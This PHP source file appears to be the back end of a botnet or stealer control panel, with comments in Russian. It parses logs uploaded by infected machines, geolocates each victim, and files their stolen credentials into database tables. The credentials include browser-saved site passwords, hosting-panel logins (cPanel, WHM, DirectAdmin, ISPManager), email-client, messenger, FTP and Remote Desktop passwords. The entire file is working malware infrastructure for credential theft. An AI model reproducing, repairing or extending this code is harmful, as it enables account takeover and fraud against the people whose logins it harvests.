<?php

preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);

$unnecessary_site = array();
//$cbp = 0;
//$cbpl = 0;
//$abp = count($match);
//$abpl = 0;
//$tize = time();

unset($log);

if(isset($match[0])){
	//$mysqli->query('update bf_threads set cv = \''.$cbp.'\', pv = \''.$abp.'\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	//$mysqli->query("INSERT DELAYED INTO bf_threads (id, pid, file, type, size, sizep, cv, pv, unnecessary, status, post_id, script, last_date, post_date post_date) VALUES ('".$thread->id."', '".$thread->pid."', '".$thread->file."', '".$thread->type."', '".$thread->size."', '".$thread->sizep."', '".$abp."', '".$cbp."', '".$thread->unnecessary."', '".$thread->status."', '".$thread->post_id."', '".$thread->script."', CURRENT_TIMESTAMP, '".$thread->post_date."') ON DUPLICATE KEY UPDATE cv='".$abp."', pv = '".$cbp."', last_date = CURRENT_TIMESTAMP");
	foreach($match as $item){
		if(!empty($item[1])){
			$matches = explode('0', $item[1], 2);
			if(!empty($matches[0]) && !empty($matches[1])){
				$prefix = strtoupper($matches[0]);
				$uid = '0' . strtoupper($matches[1]);
			}else{
				$prefix = 'UNKNOWN';
				$uid = '0UNKNOWN';
			}
			unset($matches);
		}else{
			$prefix = 'UNKNOWN';
			$uid = '0UNKNOWN';
		}
		
		if($geoip_ex != true){
			$country = geoip_country_code_by_name($item[2]);
		}else{
			if(file_exists($dir['site'] . '/cache/geoip/')) $country = geoip_country_code_by_addr($gi, $item[2]);
		}
		if(empty($country)) $country = 'UNK';
		
		preg_match_all('~#START#(.*)#NAME#(.*)#END#~isU', $item[3], $item[3], PREG_SET_ORDER);
		
		//$abpl = count($item[3]);
		//$mysqli->query('update bf_threads set cv = \''.$abpl.'\', pv = \''.$cbpl.'\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
		
		foreach($item[3] as $sitem){
			switch($sitem[1]){
				//Браузеры
				case 'Opera':
				case 'AppleSafari':
				case 'InternetExplorer':
				case 'MozillaFirefox':
				case 'GoogleChrome':
					$sitem[2] = explode("\r\n", $sitem[2]);
					if(count($sitem[2]) > 0){
						foreach($sitem[2] as $line){
							if(!empty($line)){
								$ld = explode("@@@", $line);
								if(count($ld) > 1){
									$ld[0] = preg_replace('~ \((.*)\)~', '', $ld[0]);
									if(stripos($ld[0], 'http://') !== false){
										$port = @parse_url($ld[0], PHP_URL_PORT);
										$host = get_host($ld[0]);
									}elseif(stripos($ld[0], 'https://') !== false){
										$port = @parse_url($ld[0], PHP_URL_PORT);
										$host = get_host($ld[0]);
									}elseif(stripos($ld[0], 'site://') !== false){
										$ld[0] = str_replace('site://', 'http://', $ld[0]);
										$port = @parse_url($ld[0], PHP_URL_PORT);
										$host = get_host($ld[0]);
									}else{
										$port = @parse_url($ld[0], PHP_URL_PORT);
										$host = get_host('http://' . $ld[0]);
									}
									
									$import = false;
									
									if(!file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_panels')){
										if(strpos($ld[0], '/manager/ispmgr') != false){
											$vdata = explode(':', $ld[1]);
											if(!empty($vdata[0]) && !empty($vdata[1])){
												$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$prefix.'\', \''.$uid.'\', \''.$country.'\', \''.md5($ld[0].$vdata[0].$vdata[1]).'\', \'ISPManager\', \'4\', NOW(), \''.$ld[0].'/\', \''.$vdata[0].'\', \''.$vdata[1].'\')');
										    }
										}else{
											if(!empty($port)){
												switch($port){
													case '2082':
													case '2083':
														$vdata = explode(':', $ld[1]);
														if(!empty($vdata[0]) && !empty($vdata[1])){
															$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$prefix.'\', \''.$uid.'\', \''.$country.'\', \''.md5('http://'.$host.':'.$port.'/'.$vdata[0].$vdata[1]).'\', \'cPanel\', \'1\', NOW(), \'http://'.$host.':'.$port.'/\', \''.$vdata[0].'\', \''.$vdata[1].'\')');
														}
													break;
												
													case '2086':
													case '2087':
														$vdata = explode(':', $ld[1]);
														if(!empty($vdata[0]) && !empty($vdata[1])){
															$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$prefix.'\', \''.$uid.'\', \''.$country.'\', \''.md5('http://'.$host.':'.$port.'/'.$vdata[0].$vdata[1]).'\', \'WHM\', \'2\', NOW(), \'http://'.$host.':'.$port.'/\', \''.$vdata[0].'\', \''.$vdata[1].'\')');
														}
													break;
												
													case '2222':
														$vdata = explode(':', $ld[1]);
														if(!empty($vdata[0]) && !empty($vdata[1])){
															$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$prefix.'\', \''.$uid.'\', \''.$country.'\', \''.md5($ld[0].$vdata[0].$vdata[1]).'\', \'DirectAdmin\', \'3\', NOW(), \''.$ld[0].'/\', \''.$vdata[0].'\', \''.$vdata[1].'\')');
														}
													break;
												
													default:
														//file_put_contents('unknow_panel', $port . "\r\n", FILE_APPEND);
														$import = true;
													break;
												}
											}else{
												$import = true;
											}
										}
									}
									
									if($import === true){
										$host_pre = mb_substr($host, 0, 2, 'utf8');
										if(!preg_match('~^([a-zA-Z0-9]+)$~', $host_pre)) $host_pre = 'none';
										
										if(isset($filters[$host]) && $filters[$host]['save_log'] == '1'){
											$mysqli->query('INSERT DELAYED INTO bf_save_ilog (host, md5, type) VALUES (\''.$host.'\', \''.md5($host).'\', \''.$thread->type.'\')');
											file_put_contents($dir['s']['6'] . '/' . md5($host), '#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n", FILE_APPEND);
										}
										
										if(isset($filters[$host]) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$host]['id'])){
											$count = count($ld);
											if($count == 2){
												$set_data = explode(':', $ld[1]);
											}elseif($count > 2){
												$set_data = array();
												for($i = 1; $i < count($ld); $i++){
													$s_data = explode(':', $ld[$i]);
													$set_data[$i-1] = $s_data[1];
												}
											}
		
											$count = count($filters[$host]['fields']['name']);
											if($count > 0){
												$add_sql = array();
												for($i = 1; $i <= $count; $i++){
													$set_data[$filters[$host]['fields']['grabber'][$i]-1] = rtrim($set_data[$filters[$host]['fields']['grabber'][$i]-1], '%#BOTEND#');
													if(!empty($set_data[$filters[$host]['fields']['grabber'][$i]-1])){
														$add_sql[$i] = $set_data[$filters[$host]['fields']['grabber'][$i]-1];
													}
												}
												
												if(count($add_sql) == $count){
													add_item_new($filters[$host]['id'], array($prefix, $uid, $country, $sitem[1]), $add_sql);
												}
											}
										}else{
											if(!empty($host)){
												if(!file_exists($dir['site'] . 'cache/unnecessary/' . $host_pre)){
													$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$host_pre.' LIKE adm_unnecessary.bf_unnecessary');
													file_put_contents($dir['site'] . 'cache/unnecessary/' . $host_pre, true);
												}
												add_un($host, $host_pre, gzdeflate('#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n"));
												//$mysqli->query("INSERT DELAYED INTO adm_unnecessary.bf_".$host_pre." (host, type, data) VALUES ('".$var[0]['host']."', '6', '".$mysqli->real_escape_string(gzdeflate('#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n"))."')");
											}
										}
									}
								}
							}
						}
					}
				break;

				// Почтовые клиенты
				case 'TheBat!':
				case 'WindowsLiveMail':
				case 'Eudora':
				case 'ForteAgent':
				case 'POPPeeper':
				case 'Becky':
					if(!file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_emailprograms')){
						$data = explode("...\r\n", $sitem[2]);
						if(count($data) > 0){
							foreach($data as $line){
								preg_match_all('~Email: (.*)'."\r\n".'~', $line, $email, PREG_SET_ORDER);
								preg_match_all('~Password \(POP3\): (.*)'."\r\n".'~', $line, $pass, PREG_SET_ORDER);
								if(!empty($email[0][1]) && !empty($pass[0][1])){
									//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_emailprograms.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $email[0][1] . "[|]" . $pass[0][1] . "[|]".md5($email[0][1] . $pass[0][1])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									//file_put_contents($dir['site'] . 'cache/imports/emailprograms.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $email[0][1] . "[|]" . $pass[0][1] . "[|]".md5($email[0][1] . $pass[0][1])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									$mysqli->query("INSERT DELAYED INTO bf_filter_emailprograms (prefix, uid, country, md5_hash, program, type, post_date, v1, v2) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($email[0][1] . $pass[0][1])."', '".$sitem[1]."', '1', NOW(), '".$email[0][1]."', '".$pass[0][1]."')");
								}
							}
						}
					}
				break;

				// Программы общения
				case 'Pidgin':
				case 'AIM':
				case 'Trillian':
				case 'MySpaceIM':
				case 'QIP':
				case 'CamFrog':
				case 'Paltalk':
				case 'ICQ2003/Lite':
				case 'MSNMessenger':
				case 'TrillianAstra':
				case 'WindowsLiveMessenger':
				case 'WindowsCredentials':
				case 'ASP.NETAccount':
				case 'GoogleTalk':
				case 'CiscoVPNClient':
				case 'Mail.RuAgent':
				case 'Yahoo!Messenger':
				case 'QIP.Online':
				case 'FreeCall':
				case 'Miranda':
				case 'ICQ99b-2002':
				case 'PSI':
				case 'SIM':
				case 'Pandion':
				case 'JAJC':
				case 'Digsby':
				case 'AIMPro':
					if(!file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_messengers')){
						$data = explode("...\r\n", $sitem[2]);
						if(count($data) > 0){
							foreach($data as $line){
								preg_match_all('~UIN/Name: (.*)'."\r\n".'~', $line, $uin, PREG_SET_ORDER);
								preg_match_all('~Pass: (.*) \(hex: (.*)\)'."\r\n".'~', $line, $pass, PREG_SET_ORDER);
								if(!empty($uin[0][1]) && !empty($pass[0][1]) && !empty($pass[0][2])){
									//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_messengers.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $uin[0][1] . "[|]" . $pass[0][1] . "[|]" . $pass[0][2] . "[|]".md5($uin[0][1] . $pass[0][1] . $pass[0][2])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									//file_put_contents($dir['site'] . 'cache/imports/messengers.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $uin[0][1] . "[|]" . $pass[0][1] . "[|]" . $pass[0][2] . "[|]".md5($uin[0][1] . $pass[0][1] . $pass[0][2])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									$mysqli->query("INSERT DELAYED INTO bf_filter_messengers (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($uin[0][1] . $pass[0][1] . $pass[0][2])."', '".$sitem[1]."', '1', NOW(), '".$uin[0][1]."', '".$pass[0][1]."', '".$pass[0][2]."')");
								}
							}
						}
					}
				break;

				// ФТП
				case 'FlashFXP':
				case 'Windows/Total Commander':
				case 'Windows/TotalCommander':
				case 'FileZilla':
				case 'FFFTP':
				case 'CuteFTP':
				case 'SmartFTP':
				case 'Core FTP':
				case 'CoreFTP':
				case 'WinSCP':
				case 'FTPCommander':
				case 'WS_FTP':
				case 'FARManagerFTP':
				case 'BulletProofFTPClient':
				case 'FreeFTP/DirectFTP':
				case 'FTPRush':
				case 'BitKinex':
				case 'LeapFTP':
				case 'FTPExplorer':
				case 'Fling':
				case 'SoftXFTPClient':
				case 'CoffeeCupFTP':
				case 'ClassicFTP':
					if(!file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_ftps')){
						$data = explode("\r\n", $sitem[2]);
						if(count($data) > 0){
							foreach($data as $line){
								$ld = parse_url($line);
								if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){
									//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_ftps.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $ld['host'] . "[|]" . $ld['user'] . "[|]" . $ld['pass'] . "[|]".md5($ld['host'] . $ld['user'] . $ld['pass'])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									//file_put_contents($dir['site'] . 'cache/imports/ftps.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $ld['host'] . "[|]" . $ld['user'] . "[|]" . $ld['pass'] . "[|]".md5($ld['host'] . $ld['user'] . $ld['pass'])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									$mysqli->query("INSERT DELAYED INTO bf_filter_ftps (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'])."', '".$sitem[1]."', '1', NOW(), '".$ld['host']."', '".$ld['user']."', '".$ld['pass']."')");
								}
							}
						}
					}
				break;

				case 'WinVNC':
					//
				break;

				case 'Remote Desktop Connection':
				case 'RemoteDesktopConnection':
					if(!file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_rdp')){
						$data = explode("\r\n", $sitem[2]);
						if(count($data) > 0){
							foreach($data as $line){
								$ld = parse_url($line);
								$ld['user'] = str_replace('\\', '/', $ld['user']);
								if($ld['scheme'] == 'rdp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){
									//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_rdp.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $ld['host'] . "[|]" . $ld['user'] . "[|]" . $ld['pass'] . "[|]".md5($ld['host'] . $ld['user'] . $ld['pass'])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									//file_put_contents($dir['site'] . 'cache/imports/rdp.txt', "[|]".$prefix."[|]".$uid."[|]".$country."[|]" . $ld['host'] . "[|]" . $ld['user'] . "[|]" . $ld['pass'] . "[|]".md5($ld['host'] . $ld['user'] . $ld['pass'])."[|]".$sitem[1]."[|]".$thread->type."[|][~]", FILE_APPEND);
									$mysqli->query("INSERT DELAYED INTO bf_filter_rdp (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'])."', '".$sitem[1]."', '1', NOW(), '".$ld['host']."', '".$ld['user']."', '".$ld['pass']."')");
								}
							}
						}
					}
				break;
			
				default:
					//file_put_contents($dir['site'] . '/cache/unknow_type.txt', $sitem[1] . "\r\n", FILE_APPEND);
				break;
			}
		}
		unset($item[3]);
	}
}

?>